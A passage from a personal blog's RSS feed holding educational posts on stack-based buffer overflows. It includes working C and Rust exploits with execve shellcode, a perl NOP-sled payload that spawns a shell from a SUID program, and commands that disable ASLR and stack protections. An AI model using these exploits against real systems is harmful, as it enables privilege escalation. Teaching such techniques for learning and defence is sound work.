modify the memory address. We can use gdb, as before, to get the new
memory address. There&apos;s one difference, though. Since we want to debug
the program called with &lt;code&gt;execle&lt;/code&gt;, we need to allow gdb to debug it.
Execute &lt;code&gt;set follow-fork-mode child&lt;/code&gt; in gdb and add a break to the main
function. It will eventually stop in &lt;code&gt;notesearch&lt;/code&gt;. Once there, search
the shellcode in the stack frame as we did before.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/follow-child.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The exploit in C is quite self-explanatory. We create the argument, the
environment and execute &lt;code&gt;notesearch&lt;/code&gt; with them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;

char shellcode[]=&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;;

int main(int argc, char *argv[]) {
    char buffer[120 + 8];
    memset(buffer, &apos;a&apos;, 120);
    memcpy(&amp;amp;buffer[120], &quot;\x75\xe9\xff\xff\xff\x7f&quot;, 8);

    char* env[2] = {shellcode, 0};
    execle(&quot;notesearch&quot;, &quot;./notesearch&quot;, buffer, 0, env);
    free(buffer);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/c-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The same exploit in Rust.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;use std::ffi::OsStr;
use std::process::Command;

fn main() {
    let shellcode = unsafe {
        OsStr::from_encoded_bytes_unchecked(&amp;amp;[
            0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
            0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
        ])
    };

    let shellcode_address = [0xd3, 0xef, 0xff, 0xff, 0xff, 0x7f];
    let memory = [0x61; 120]
        .iter()
        .chain(shellcode_address.iter())
        .map(|x| *x as u8)
        .collect::&amp;lt;Vec&amp;lt;u8&amp;gt;&amp;gt;();
    let memory_arg = unsafe { OsStr::from_encoded_bytes_unchecked(&amp;amp;memory) };

    Command::new(&quot;./notesearch&quot;)
        .arg(memory_arg)
        .env_clear()
        .env(&quot;SHELLCODE&quot;, shellcode)
        .spawn()
        .unwrap()
        .wait_with_output()
        .unwrap();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/rust-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/shellcode-env-var.CG5A6neK.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Stack-based buffer overflows</title><link>https://danielorihuela.dev/blog/stack-based-buffer-overflows/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/stack-based-buffer-overflows/</guid><description>Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them.</description><pubDate>Fri, 20 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#whats-a-buffer-overflow&quot;&gt;What&apos;s a buffer overflow?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#whats-the-stack&quot;&gt;What&apos;s the stack?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-to-exploit-stack-based-buffer-overflows&quot;&gt;How to exploit stack based buffer
overflows&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#overwrite-local-variable-in-stack-frame&quot;&gt;Overwrite local variable in stack
frame&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#overwrite-return-address&quot;&gt;Overwrite return address&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#get-shell&quot;&gt;Get shell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-can-we-prevent-buffer-overflows&quot;&gt;How can we prevent buffer
overflows?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;What&apos;s a buffer overflow?&lt;/h1&gt;
&lt;p&gt;Buffer overflows are a type of vulnerability where the attacker gives
more data to a buffer than it can handle. As a result, the program
overwrites adjacent memory locations with the exceeding data. Usually,
the program will crash. However, a skilled hacker can take control of
the program as it crashes and achieve incredible things, like access to
a shell. Nowadays, there are some countermeasures in place. They make it
much harder but not impossible. Especially if using languages like C or
C++, that lets developers manage the memory.&lt;/p&gt;
&lt;p&gt;There are two types of buffer overflows: stack-based and heap-based. In
this post, we will talk about the first type.&lt;/p&gt;
&lt;h1&gt;What&apos;s the stack?&lt;/h1&gt;
&lt;p&gt;Before jumping right into stack-based buffer overflows, we need to
understand what a &quot;stack&quot; is in this context and how it works.&lt;/p&gt;
&lt;p&gt;The stack is a region of memory reserved for each thread to store data.
Each time you call a function, a stack frame is created where the
arguments, the local variables and the return address are stored in a
Last Input First Output (LIFO) manner. Once it finishes, the program
&quot;removes&quot; the stack frame from the stack and resumes the execution of
the caller thanks to the return address. Now, on the top of the stack,
we have the stack frame from the resumed function. The program is ready
to go.&lt;/p&gt;
&lt;p&gt;Stack example:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/stack-frame-graph.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Great! We understand the basis of how the stack works at a high level.
However, we still need to know the low-level details of that process if
we want to exploit it. So, what&apos;s actually happening? How does the
computer know which instruction to execute? How does the computer know
how to resume the execution of the caller function? How does it create
and remove the stack frame? That&apos;s all due to registers. The CPU of a
computer use different registers to store data, transfer data, store
instructions, … We are interested in the Extended Instruction Pointer
(EIP), which stores the memory address of the next instruction to
execute; the Extended Stack Pointer (ESP), which points to the top of
the stack frame; and the Extended Base Pointer (EBP), which points to
the bottom of the stack frame. Whenever we call a function, the EBP will
store the actual ESP. The end of the caller function stack frame is the
beginning of the called function stack frame. Pushing data to the stack
will increase the ESP. The EIP will point to the next instruction to
execute. Once we reach the return statement, the ESP will be equal to
EBP (removing the stack frame) and the EIP will be equal to the return
address. The process is much more complex than that. For instance, I&apos;m
not explaining how the EBP is restored. I encourage you to do some
further research about the topic. I don&apos;t think we need more for that
post.&lt;/p&gt;
&lt;p&gt;We should have a clear idea of how stack frames work and some lower
details. We are ready to exploit some programs.&lt;/p&gt;
&lt;h1&gt;How to exploit stack based buffer overflows&lt;/h1&gt;
&lt;p&gt;Relevant system information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux 5.15.0-86-generic x86_64&lt;/li&gt;
&lt;li&gt;Intel(R) Core(TM) i7-10510U CPU&lt;/li&gt;
&lt;li&gt;Little Endian&lt;/li&gt;
&lt;li&gt;48 bits address size&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All the vulnerable programs are from &lt;strong&gt;Hacking: The Art of Exploitation,
2nd Edition&lt;/strong&gt;. They may contain modification to use in modern machines.
You can get the original source code
&lt;a href=&quot;https://github.com/intere/hacking/blob/master/booksrc&quot;&gt;https://github.com/intere/hacking/blob/master/booksrc&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Overwrite local variable in stack frame&lt;/h2&gt;
&lt;p&gt;Let&apos;s start with the &lt;code&gt;auth_overflow.c&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int check_authentication(char *password) {
  int auth_flag = 0;
  char password_buffer[16];

  strcpy(password_buffer, password);

  if(strcmp(password_buffer, &quot;brillig&quot;) == 0)
    auth_flag = 1;
  if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0)
    auth_flag = 1;

  return auth_flag;
}

int main(int argc, char *argv[]) {
  if(argc &amp;lt; 2) {
    printf(&quot;Usage: %s &amp;lt;password&amp;gt;\n&quot;, argv[0]);
    exit(0);
  }
  if(check_authentication(argv[1])) {
    printf(&quot;\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);
    printf(&quot;      Access Granted.\n&quot;);
    printf(&quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);
  } else {
    printf(&quot;\nAccess Denied.\n&quot;);
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The program is simple. It receives a password. If it&apos;s equal to
&quot;brillig&quot; or &quot;outgrabe&quot; we will see the message &quot;Access Granted&quot;,
otherwise, we will see &quot;Access Denied&quot;. With a buffer overflow, we can
get the &quot;Access Granted&quot; message even when the password is invalid.&lt;/p&gt;
&lt;p&gt;The error is inside the &lt;code&gt;check_authentication&lt;/code&gt; function, which copies
the &lt;code&gt;password&lt;/code&gt; data to the &lt;code&gt;password_buffer&lt;/code&gt; without checking the
length. Notice that the &lt;code&gt;password_buffer&lt;/code&gt; can hold a maximum of 16
bytes. In other words, the program will reserve 16 bytes in the stack
for that variable. Nevertheless, the data behind the &lt;code&gt;password&lt;/code&gt; pointer
can hold a larger array of characters. The idea here is to give the
program a password longer than 16 bytes so that when the data is copied
into the &lt;code&gt;password_buffer&lt;/code&gt;, the extra bytes overwrite the &lt;code&gt;auth_flag&lt;/code&gt;.
That&apos;s the boolean that decides the message to be shown. If we can
control it, we can control the printed message. Remember that the stack
frame is a LIFO. Hence, the &lt;code&gt;password_buffer&lt;/code&gt; will be on top of the
&lt;code&gt;auth_flag&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let&apos;s compile the program and execute it with a bigger password than
expected.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc auth_overflow.c -o auth_overflow
./auth_overflow &quot;password&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I&apos;ve tried with several lengths. With 25 characters, the program fails.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-stack-smashing.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;There&apos;s something curious, though. The function variables only take 20
bytes, 16 for the &lt;code&gt;password_buffer&lt;/code&gt; and 4 for the &lt;code&gt;auth_flag&lt;/code&gt;, but we
need 25 bytes to make it fail. I did some research, and it seems like it
could be related to some padding that the compiler or the system is
adding between variables. In any case, the program is failing with
&quot;stack smashing&quot;. That tells us that the compiler detected the buffer
overflow attack and stoped the execution. Current versions of GCC use
&quot;canaries&quot; to detect buffer overflows. It adds some data in the stack
frame at the beginning of the function and expects that it remains
unchanged when exiting it. Let&apos;s disable that for our learning.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc auth_overflow.c -o auth_overflow -fno-stack-protector
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-no-stack-protector.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;With canaries disabled, let&apos;s see how many bytes are between the
&lt;code&gt;password_buffer&lt;/code&gt; and the &lt;code&gt;auth_flag&lt;/code&gt;. That will tell us the password
length needed to overwrite the &lt;code&gt;auth_flag&lt;/code&gt;. For that, we can use gdb.
It&apos;s only a matter of placing a breakpoint inside the vulnerable
function and checking the memory addresses.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc auth_overflow.c -o auth_overflow -fno-stack-protector -g # -g option adds debug symbols
gdb ./auth_overflow
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-gdb-variables-distance.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;There are 28 bytes between the two variables. That means that we need a
password with 29 characters. The first 28 to fill the space between the
variables, and the last one to overwrite the &lt;code&gt;auth_flag&lt;/code&gt;. We need it to
be different to 0. For example, &quot;a&quot; should overwrite the &lt;code&gt;auth_flag&lt;/code&gt;
value with its ASCII decimal value (97). We can see that in action by
placing a couple of breakpoints. One before the &lt;code&gt;strcpy&lt;/code&gt; and one after.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-auth-flag-new-value.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That&apos;s it! We got the &quot;Access Granted&quot; message.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-access-granted.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Overwrite return address&lt;/h2&gt;
&lt;p&gt;The first example is limited, right? We can do something interesting
only if the variable we want to overwrite is stored in the stack before
the one we are using to exploit it. What could we do if the variable is
not there or appears after? The idea in that situation is to overwrite
the return address.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int check_authentication(char *password) {
  char password_buffer[16];

  strcpy(password_buffer, password);

  int auth_flag = 0;
  if(strcmp(password_buffer, &quot;brillig&quot;) == 0)
    auth_flag = 1;
  if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0)
    auth_flag = 1;

  return auth_flag;
}

int main(int argc, char *argv[]) {
  if(argc &amp;lt; 2) {
    printf(&quot;Usage: %s &amp;lt;password&amp;gt;\n&quot;, argv[0]);
    exit(0);
  }
  if(check_authentication(argv[1])) {
    printf(&quot;\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);
    printf(&quot;      Access Granted.\n&quot;);
    printf(&quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);
  } else {
    printf(&quot;\nAccess Denied.\n&quot;);
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;First, compile it without security protections and debug symbols. Here
we added the &lt;code&gt;no-pie&lt;/code&gt; option. PIE stands for Position Independent
Executable. If enabled, the executable will be loaded in a different
memory address every time.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc auth_overflow2.c -o auth_overflow2 -fno-stack-protector -no-pie -g
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, where is the return address? How can we overwrite it? As in the
first example, gdb is our friend. We can put a breakpoint inside
&lt;code&gt;check_authentication&lt;/code&gt;, run and execute &lt;code&gt;info frame&lt;/code&gt;. The &lt;code&gt;rip&lt;/code&gt; register
contains the return address.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-info-frame.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;At this point, it&apos;s a matter of trying several passwords until we find
the number of bytes till the &lt;code&gt;rip&lt;/code&gt; register. Same procedure as in the
first example. Writing a password with 40 &quot;a&quot; and 3 &quot;b&quot; will overwrite
the &lt;code&gt;rip&lt;/code&gt; with the ASCII value of &quot;bbb&quot; (0x626262).&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-overwrite-rip.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That&apos;s cool, but we want to overwrite the &lt;code&gt;rip&lt;/code&gt; to change the code flow
and show us the &quot;Access Granted&quot; message. We can disassemble the main
function to see where the &lt;code&gt;print&lt;/code&gt; functions are and get the memory
address for the first &lt;code&gt;print&lt;/code&gt;. The +86 memory address points to the
conditional before the prints. We can take the next address. If PIE was
enabled, this wouldn&apos;t be that easy. The address would change every time
we run it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-access-granted-address.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Replacing &quot;bbb&quot; with &quot;&lt;code&gt;\x&lt;/code&gt;{=latex}7f&lt;code&gt;\x12&lt;/code&gt;{=latex}&lt;code&gt;\x40&lt;/code&gt;{=latex}&quot; gives
us the &quot;Access Granted&quot; message. We add the memory address in reverse
because my machine uses Little Endian.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-access-granted.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Get shell&lt;/h2&gt;
&lt;p&gt;The second example was a bit more interesting, but still limited. In
this final example, we are going to see how to get access to a shell.&lt;/p&gt;
&lt;p&gt;We have two small programs. The first program creates notes in
&quot;/var/notes&quot;. root must own the executable and have the SUID activated.
That way, we can execute it with normal users as if it was root.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &quot;hacking.h&quot;

void usage(char *prog_name, char *filename)
{
  printf(&quot;Usage: %s &amp;lt;data to add to %s&amp;gt;\n&quot;, prog_name, filename);
  exit(0);
}

void fatal(char *);            // A function for fatal errors
void *ec_malloc(unsigned int); // An error-checked malloc() wrapper

int main(int argc, char *argv[])
{
  int userid, fd; // File descriptor
  char *buffer, *datafile;

  buffer = (char *)ec_malloc(100);
  datafile = (char *)ec_malloc(20);
  strcpy(datafile, &quot;/var/notes&quot;);

  if (argc &amp;lt; 2)                 // If there aren&apos;t command-line arguments,
    usage(argv[0], datafile); // display usage message and exit.

  strcpy(buffer, argv[1]); // Copy into buffer.

  printf(&quot;[DEBUG] buffer @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);
  printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);

  // Opening the file
  fd = open(datafile, O_WRONLY | O_CREAT | O_APPEND, S_IRUSR | S_IWUSR);
  if (fd == -1)
    fatal(&quot;in main() while opening file&quot;);
  printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);

  userid = getuid(); // Get the real user ID.

  // Writing data
  if (write(fd, &amp;amp;userid, 4) == -1) // Write user ID before note data.
    fatal(&quot;in main() while writing userid to file&quot;);
  write(fd, &quot;\n&quot;, 1);                          // Terminate line.
  if (write(fd, buffer, strlen(buffer)) == -1) // Write note.
    fatal(&quot;in main() while writing buffer to file&quot;);

  write(fd, &quot;\n&quot;, 1); // Terminate line.
  // Closing file
  if (close(fd) == -1)
    fatal(&quot;in main() while closing file&quot;);
  printf(&quot;Note has been saved.\n&quot;);
  free(buffer);
  free(datafile);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;gcc notetaker.c -o notetaker -g
sudo chown root:root notetaker
sudo chmod u+s notetaker
./notetaker &quot;example message&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The second program, the vulnerable one, is used to search notes for the
current user. Optionally, we can show only the messages that contain a
specific string.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &quot;hacking.h&quot;

#define FILENAME &quot;/var/notes&quot;

int print_notes(int, int, char *); // Note printing function.
int find_user_note(int, int);      // Seek in file for a note for user.
int search_note(char *, char *);   // Search for keyword function.
void fatal(char *);                // Fatal error handler

int main(int argc, char *argv[])
{
  int userid, printing = 1, fd; // File descriptor
  char searchstring[100];
  if (argc &amp;gt; 1)                      // If there is an arg,
    strcpy(searchstring, argv[1]); // that is the search string;
  else                               // otherwise,
    searchstring[0] = 0;           // search string is empty.
  userid = getuid();
  fd = open(FILENAME, O_RDONLY); // Open the file for read-only access.
  if (fd == -1)
    fatal(&quot;in main() while opening file for reading&quot;);
  printf(&quot;%i&quot;, printing);
  while (printing)
    printing = print_notes(fd, userid, searchstring);
  printf(&quot;-------[ end of note data ]-------\n&quot;);
  close(fd);
}

// A function to print the notes for a given uid that match
// an optional search string;
// returns 0 at end of file, 1 if there are still more notes.
int print_notes(int fd, int uid, char *searchstring)
{
  int note_length;
  char byte = 0, note_buffer[100];
  note_length = find_user_note(fd, uid);
  if (note_length == -1)                      // If end of file reached,
    return 0;                               // return 0.
  read(fd, note_buffer, note_length);         // Read note data.
  note_buffer[note_length] = 0;               // Terminate the string.
  if (search_note(note_buffer, searchstring)) // If searchstring found,
    printf(note_buffer);                    // print the note.
  return 1;
}

// A function to find the next note for a given userID;
// returns -1 if the end of the file is reached;
// otherwise, it returns the length of the found note.
int find_user_note(int fd, int user_uid)
{
  int note_uid = -1;
  unsigned char byte;
  int length;
  while (note_uid != user_uid)
    {                                                        // Loop until a note for user_uid is found.
      if (read(fd, &amp;amp;note_uid, 4) != 4) // Read the uid data.
        return -1;                                       // If 4 bytes aren&apos;t read, return end of file code.
      if (read(fd, &amp;amp;byte, 1) != 1)                         // Read the newline separator.
        return -1;
      byte = length = 0;
      while (byte != &apos;\n&apos;)
        {                                // Figure out how many bytes to the end of line.
          if (read(fd, &amp;amp;byte, 1) != 1) // Read a single byte.
            return -1;               // If byte isn&apos;t read, return end of file code.
          length++;
        }
    }
  lseek(fd, length * -1, SEEK_CUR); // Rewind file reading by length bytes.
  printf(&quot;[DEBUG] found a %d byte note for user id %d\n&quot;, length, note_uid);
  return length;
}

// A function to search a note for a given keyword;
// returns 1 if a match is found, 0 if there is no match.
int search_note(char *note, char *keyword)
{
  int i, keyword_length, match = 0;
  keyword_length = strlen(keyword);
  if (keyword_length == 0) // If there is no search string,
    return 1;            // always &quot;match&quot;.
  for (i = 0; i &amp;lt; strlen(note); i++)
    {                                  // Iterate over bytes in note.
      if (note[i] == keyword[match]) // If byte matches keyword,
        match++;                   // get ready to check the next byte;
      else
        {                              // otherwise,
          if (note[i] == keyword[0]) // if that byte matches first keyword byte,
            match = 1;             // start the match count at 1.
          else
            match = 0; // Otherwise it is zero.
        }
      if (match == keyword_length) // If there is a full match,
        return 1;                // return matched.
    }
  return 0; // Return not matched.
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;gcc notesearch.c -o notesearch -fno-stack-protector -no-pie -g
sudo chown root:root notesearch
sudo chmod u+s notesearch
./notesearch &quot;example&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We need to disable the Adress Space Layout Randomization (ASLR) to avoid
random memory addreses.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You may be wondering if ASLR and PIE do the same. Both disable the
randomization of memory addresses for executables. That&apos;s true. However,
they randomize different things. ASLR is a kernel protection feature,
and it has three levels in Linux:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Disable ASLR. This setting is applied if the kernel is booted with
the norandmaps boot parameter (in Linux).&lt;/li&gt;
&lt;li&gt;Randomize the positions of the stack, virtual dynamic shared object
(VDSO) page, and shared memory regions. The base address of the data
segment is located immediately after the end of the executable code
segment.&lt;/li&gt;
&lt;li&gt;Randomize the positions of the stack, VDSO page, shared memory
regions, and the data segment. This is the default setting.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;PIE is a binary protection feature that places the &quot;code segment&quot;, the
&quot;global offset table&quot; and their &quot;procedure linkage table&quot; at random
locations.&lt;/p&gt;
&lt;p&gt;The last security protection we need to &lt;a href=&quot;https://superuser.com/a/1385242&quot;&gt;disable is the NX
bit&lt;/a&gt;. That will make the stack
executable. In other words, we will be able to execute the shellcode.&lt;/p&gt;
&lt;p&gt;Let&apos;s take a step back. Where is the vulnerability? The notetaker &lt;code&gt;main&lt;/code&gt;
function calls &lt;code&gt;strcpy&lt;/code&gt;. Again, there&apos;s no control over the length of
the copied data. The high-level idea is the same as in the last
exercise. We want to overwrite the return address to take control of the
flow. The way to find it is the same. However, the payload is structured
differently. We aren&apos;t going to send a bunch of &quot;a&quot; followed by a memory
address in the executable. We want to build a payload that looks like:
&quot;NOP sled, shellcode, some more NOP operations, NOP sled address&quot;. Let
me explain each part.&lt;/p&gt;
&lt;p&gt;First, we have the &quot;NOP sled&quot;. A NOP is a no-operation instruction that
CPUs include for timing purposes, among other things. In our case, we
use them to force the computer to slide into the shellcode we introduced
in the stack. Theoretically, you could do it without the aid of a &quot;NOP
sled&quot;, but it becomes much harder. You will have problems with memory
alignment and other low-level stuff that I lack knowledge of. Moreover,
the compiler is picky and won&apos;t allow you to execute the shellcode from
whatever memory address you want.&lt;/p&gt;
&lt;p&gt;Then, we have the shellcode. A small piece of code built in assembler to
execute some code. In that example, to give us access to a shell.&lt;/p&gt;
&lt;p&gt;Following the shellcode, we find some more NOP operations. Sometimes,
shellcodes need to write some bytes after themselves. The compiler can
complain about that. These NOP operations will help us.&lt;/p&gt;
&lt;p&gt;The last part is the return address. We will overwrite it with a memory
address where the NOP sled is located.&lt;/p&gt;
&lt;p&gt;That&apos;s it for the structure. Coming back to the exploit, on my first try
I used a &quot;NOP sled, shellcode, NOP sled address&quot; structure. It didn&apos;t
work for multiple reasons. NX bit wasn&apos;t disabled and ASLR wasn&apos;t
disabled.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/notesearch-stack.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After disabling them, the issue was creating the correct payload.
Sometimes, the execution failed with a SEGFAULT and sometimes with a
SIGILL. Trying a myriad of different payload structures and lengths for
the NOP operations, I finally crafted a payload that worked using gdb.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/notesearch-gdb-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;This payload doesn&apos;t work outside gdb. The environment in which we
execute the exploit can modify the position of the variables in the
stack. For example, the environment variables used on gdb differ from
the ones on the shell. To circumvent that issue, we can pass the
environment variables to gdb.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;env gdb notesearch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The path from where you execute the exploit is also relevant.
&lt;code&gt;./notesearch $(perl -e &apos;print &quot;\x90&quot; x 57, &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;, &quot;\x90&quot; x 40, &quot;\x90\xe3\xff\xff\xff\x7f\x00\x00&quot;&apos;)&lt;/code&gt;
didn&apos;t work for me, while
&lt;code&gt;~/Desktop/overflow/notesearch $(perl -e &apos;print &quot;\x90&quot; x 57, &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;, &quot;\x90&quot; x 40, &quot;\x90\xe3\xff\xff\xff\x7f\x00\x00&quot;&apos;)&lt;/code&gt;
worked.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/notesearch-final-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That&apos;s it!!! We got our shell. In theory, we should get root access due
to the SUID permissions. However, some shells now throw SUID permissions
when spawning new shells from a process with SUID to avoid this kind of
attacks. More stuff to learn in the future!&lt;/p&gt;
&lt;h1&gt;How can we prevent buffer overflows?&lt;/h1&gt;
&lt;p&gt;DON&apos;T COPY DATA WITHOUT CHECKING THE LENGTH!&lt;/p&gt;
&lt;p&gt;Most people forget to do that, so luckily, there are some security
features that mitigate the attack. We have seen a some of them during
the exercise: canaries, PIE, ASLR or NX bit.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Now we know what a stack based buffer overflow is, why it works, how to
exploit it and some protections mechanisms. We don&apos;t have an execuse to
avoid them.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Why the Clojure REPL is so cool</title><link>https://danielorihuela.dev/blog/why-the-clojure-repl-is-so-cool/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/why-the-clojure-repl-is-so-cool/</guid><description>Discover why the Clojure REPL experience is superior, and how to harness its power for smoother coding.</description><pubDate>Sun, 28 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;A couple of weeks ago, I started a side project. The idea is to create a
simple book reading tracker website, and I decided to go with Clojure.
Why? You may wonder. Well. I wanted to play with and experience a couple
of things: building an application using a functional programming
approach and working with a LISP REPL.&lt;/p&gt;
&lt;p&gt;At first, I had a hard time developing some frontend with ClojureScript.
I was using a new language with new tools and frameworks and not taking
full advantage of one of &lt;a href=&quot;https://www.youtube.com/watch?v=gIoadGfm5T8&quot;&gt;Clojure&apos;s
superpowers&lt;/a&gt;, the REPL. I
was working the same way I used to work with other languages. I write
some code, write some tests (if necessary), compile it, run it, check if
anything is wrong, fix it and repeat. However, lispy languages allow you
to use the REPL to interact with your running code in real time without
building it again. Other languages, like Java, also offer a REPL.
However, &lt;a href=&quot;https://news.ycombinator.com/item?id=23811382&quot;&gt;lispy languages are built with the REPL in
